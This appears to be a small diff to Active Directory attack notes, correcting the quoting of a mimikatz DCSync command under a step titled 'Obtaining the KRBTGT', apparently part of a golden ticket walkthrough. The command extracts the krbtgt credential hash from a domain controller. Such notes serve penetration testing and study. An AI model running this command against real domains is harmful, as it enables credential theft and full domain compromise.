@@ -73,7 +73,7 @@ bloodhound
 
 1) **Obtaining the KRBTGT**
 ```powershell
-mimikatz.exe "lsadump::dcsync" "/user:LOGISTICS\krbtgt"
+mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt"
 ```
 2) **Using Get-DomainSID**
 ```powershell
